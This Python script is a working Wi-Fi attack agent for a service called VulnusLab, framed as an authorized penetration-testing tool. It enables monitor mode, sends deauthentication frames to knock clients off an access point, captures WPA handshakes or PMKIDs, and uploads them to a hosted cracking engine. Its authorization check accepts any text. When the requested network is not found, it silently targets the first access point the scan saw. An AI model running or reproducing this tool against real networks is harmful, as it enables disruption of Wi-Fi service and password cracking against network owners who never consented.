#!/usr/bin/env python3
"""VulnusLab on-site Wi-Fi capture agent.

Runs the LIVE-RF half of the wireless methodology on a host that has a
monitor-mode-capable Wi-Fi adapter physically near the target access point,
then uploads the capture to the VulnusLab hosted engine for offline analysis
(/api/wireless/handshake_crack/upload). The hosted engine never does live RF;
this agent never does the offline crack. The split exists because handshake /
PMKID capture needs radio hardware and proximity that a cloud server lacks.

Steps performed (standard authorized WPA/WPA2 test):
  1. enable monitor mode on the adapter (airmon-ng)
  2. scan for the target AP + its channel/clients (airodump-ng)
  3. capture the 4-way handshake, optionally forcing a client reconnect with a
     targeted deauth (aireplay-ng), OR capture the PMKID directly (hcxdumptool)
  4. restore the adapter to managed mode
  5. upload the capture to the hosted engine

AUTHORIZATION: capturing traffic from a Wi-Fi network you do not own or lack
written permission to test is illegal in most jurisdictions. This agent will
not run without an explicit --authorize acknowledgment, and it records that
acknowledgment alongside the upload. Use it only within the scope of an
authorized engagement.

Requires root and: airmon-ng, airodump-ng, aireplay-ng (aircrack-ng suite),
and hcxdumptool for the PMKID path. Standard library only (no pip deps).
"""
from __future__ import annotations
import argparse
import csv
import glob
import json
import mimetypes
import os
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import urllib.request
import uuid

REQUIRED_BASE = ["airmon-ng", "airodump-ng", "aireplay-ng"]


def _die(msg: str, code: int = 1):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def _have(binname: str) -> bool:
    return shutil.which(binname) is not None


def _run(cmd: list[str], timeout: int | None = None, check: bool = False) -> subprocess.CompletedProcess:
    print(f"[>] {' '.join(cmd)}")
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)


def preflight(args) -> None:
    if os.geteuid() != 0:
        _die("must run as root (monitor mode + capture need CAP_NET_ADMIN/RAW)")
    needed = list(REQUIRED_BASE)
    if args.pmkid:
        needed = ["hcxdumptool"]
    missing = [b for b in needed if not _have(b)]
    if missing:
        _die(f"missing required tool(s): {', '.join(missing)}. "
             f"Install the aircrack-ng suite / hcxdumptool and retry.")
    if not args.authorize:
        _die("refusing to run without --authorize. Pass --authorize "
             "\"<ticket/owner/scope>\" to confirm you have written permission "
             "to test this network. Unauthorized Wi-Fi capture is illegal.")


def enable_monitor(interface: str) -> str:
    """airmon-ng start <iface>; return the monitor interface name."""
    _run(["airmon-ng", "check", "kill"])  # stop NetworkManager/wpa_supplicant interference
    _run(["airmon-ng", "start", interface])
    # airmon-ng typically creates <iface>mon or renames to wlan0mon; detect it.
    out = _run(["iw", "dev"]).stdout if _have("iw") else ""
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface ") and ("mon" in line or line.endswith("mon")):
            return line.split(None, 1)[1].strip()
    # Fallbacks commonly used by airmon-ng
    for cand in (f"{interface}mon", interface):
        return cand
    return interface


def restore_managed(mon_iface: str, interface: str) -> None:
    _run(["airmon-ng", "stop", mon_iface])
    if _have("systemctl"):
        _run(["systemctl", "restart", "NetworkManager"])


def scan_for_targets(mon_iface: str, duration: int) -> list[dict]:
    """Short airodump-ng sweep -> parsed AP list (bssid, channel, essid)."""
    tmp = tempfile.mkdtemp(prefix="vl_wifi_scan_")
    prefix = os.path.join(tmp, "scan")
    proc = subprocess.Popen(
        ["airodump-ng", "--output-format", "csv", "-w", prefix, mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(max(10, duration))
    proc.send_signal(signal.SIGINT)
    try: proc.wait(timeout=10)
    except Exception: proc.kill()
    aps: list[dict] = []
    for csv_path in glob.glob(prefix + "*.csv"):
        with open(csv_path, newline="", errors="replace") as fh:
            for row in csv.reader(fh):
                if len(row) >= 14 and ":" in row[0] and row[0].strip().count(":") == 5:
                    aps.append({"bssid": row[0].strip(),
                                "channel": row[3].strip(),
                                "essid": row[13].strip()})
    return aps


def capture_handshake(mon_iface: str, bssid: str, channel: str, out_prefix: str,
                      duration: int, deauth: int) -> str | None:
    """airodump-ng locked to the target; optional aireplay-ng deauth to force a
    reconnect. Returns the .cap path if a capture file was produced."""
    proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", out_prefix, "--output-format", "pcap", mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if deauth > 0:
            time.sleep(5)  # let airodump lock on first
            # Targeted deauth: broadcast to the AP's clients to force a reconnect
            # (and thus a fresh 4-way handshake). Small count, authorized use.
            _run(["aireplay-ng", "--deauth", str(deauth), "-a", bssid, mon_iface],
                 timeout=60)
        time.sleep(max(15, duration))
    finally:
        proc.send_signal(signal.SIGINT)
        try: proc.wait(timeout=10)
        except Exception: proc.kill()
    caps = sorted(glob.glob(out_prefix + "*.cap"))
    if not caps:
        return None
    cap = caps[-1]
    # Confirm a handshake is actually present if aircrack-ng is on the agent.
    if _have("aircrack-ng"):
        res = _run(["aircrack-ng", cap])
        if "1 handshake" in res.stdout or "handshake" in res.stdout.lower():
            print("[+] handshake present in capture")
        else:
            print("[!] no confirmed handshake yet - capture uploaded anyway; "
                  "re-run with --deauth to force a reconnect")
    return cap


def capture_pmkid(interface: str, bssid: str, duration: int, out_prefix: str) -> str | None:
    """hcxdumptool PMKID capture (no client needed). Produces a .pcapng."""
    out = out_prefix + ".pcapng"
    proc = subprocess.Popen(
        ["hcxdumptool", "-i", interface, "-o", out,
         "--enable_status=1"] + (["--filterlist_ap", bssid, "--filtermode=2"] if bssid else []),
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(max(20, duration))
    proc.send_signal(signal.SIGINT)
    try: proc.wait(timeout=10)
    except Exception: proc.kill()
    return out if os.path.isfile(out) else None


def upload(server: str, token: str, authorize: str, cap_path: str,
           essid: str, bssid: str) -> None:
    """Multipart-upload the capture to the hosted engine (stdlib only)."""
    url = server.rstrip("/") + "/api/wireless/handshake_crack/upload"
    boundary = "----vlwifi" + uuid.uuid4().hex
    with open(cap_path, "rb") as fh:
        data = fh.read()
    fname = os.path.basename(cap_path)
    ctype = mimetypes.guess_type(fname)[0] or "application/octet-stream"
    body = b"".join([
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'.encode(),
        f"Content-Type: {ctype}\r\n\r\n".encode(),
        data, b"\r\n",
        f"--{boundary}--\r\n".encode(),
    ])
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    req.add_header("X-VL-Authorization-Ack", "true")
    req.add_header("X-VL-Authorization-Scope", authorize[:200])
    try:
        with urllib.request.urlopen(req, timeout=120) as resp:
            payload = json.loads(resp.read().decode("utf-8", "replace"))
    except Exception as e:
        _die(f"upload failed: {e}")
    print(f"[+] uploaded: {json.dumps(payload)}")
    print("[i] Analyze it on the engine:")
    print("    POST /api/wireless/handshake_crack  with body:")
    print(json.dumps({"target": essid or bssid,
                      "authorization_ack": True,
                      "authorization_scope": authorize[:120],
                      "options": {"capture_path": payload.get("capture_path"),
                                  "bssid": bssid}}, indent=2))


def main() -> None:
    ap = argparse.ArgumentParser(description="VulnusLab on-site Wi-Fi capture agent")
    ap.add_argument("--interface", required=True, help="wireless adapter, e.g. wlan0")
    ap.add_argument("--server", required=True, help="hosted engine base URL, e.g. https://vulnuslab.com")
    ap.add_argument("--token", default=os.environ.get("VL_TOKEN", ""), help="API bearer token (or $VL_TOKEN)")
    ap.add_argument("--authorize", default="", help='written-permission acknowledgment / scope ref (REQUIRED)')
    ap.add_argument("--bssid", default="", help="target AP BSSID; if omitted, scan first and pick by --essid")
    ap.add_argument("--essid", default="", help="target SSID (used to pick from a scan when --bssid omitted)")
    ap.add_argument("--channel", default="", help="target channel (auto-detected from scan if omitted)")
    ap.add_argument("--duration", type=int, default=60, help="capture seconds (default 60)")
    ap.add_argument("--deauth", type=int, default=0, help="deauth frames to force a reconnect (0 = passive)")
    ap.add_argument("--pmkid", action="store_true", help="capture PMKID via hcxdumptool instead of a handshake")
    ap.add_argument("--no-upload", action="store_true", help="capture only; do not upload")
    args = ap.parse_args()

    preflight(args)

    out_dir = tempfile.mkdtemp(prefix="vl_wifi_cap_")
    out_prefix = os.path.join(out_dir, "capture")
    bssid, channel, essid = args.bssid, args.channel, args.essid
    mon_iface = None
    try:
        if args.pmkid:
            cap = capture_pmkid(args.interface, bssid, args.duration, out_prefix)
        else:
            mon_iface = enable_monitor(args.interface)
            print(f"[+] monitor interface: {mon_iface}")
            if not bssid:
                print("[*] scanning for target AP ...")
                aps = scan_for_targets(mon_iface, min(args.duration, 30))
                match = None
                for a in aps:
                    if essid and a["essid"].lower() == essid.lower():
                        match = a; break
                if not match and aps:
                    match = aps[0]
                if not match:
                    _die("no access points found in scan; move closer or pass --bssid/--channel")
                bssid, channel, essid = match["bssid"], match["channel"], match["essid"]
                print(f"[+] target: {essid} [{bssid}] ch {channel}")
            if not channel:
                _die("channel unknown; pass --channel or let the scan detect it")
            cap = capture_handshake(mon_iface, bssid, channel, out_prefix,
                                    args.duration, args.deauth)
        if not cap:
            _die("no capture produced; retry closer to the AP or with --deauth")
        print(f"[+] capture written: {cap}")
        if args.no_upload:
            print("[i] --no-upload set; capture kept locally only.")
            return
        if not args.server:
            _die("no --server given and upload requested")
        upload(args.server, args.token, args.authorize, cap, essid, bssid)
    finally:
        if mon_iface:
            restore_managed(mon_iface, args.interface)


if __name__ == "__main__":
    main()
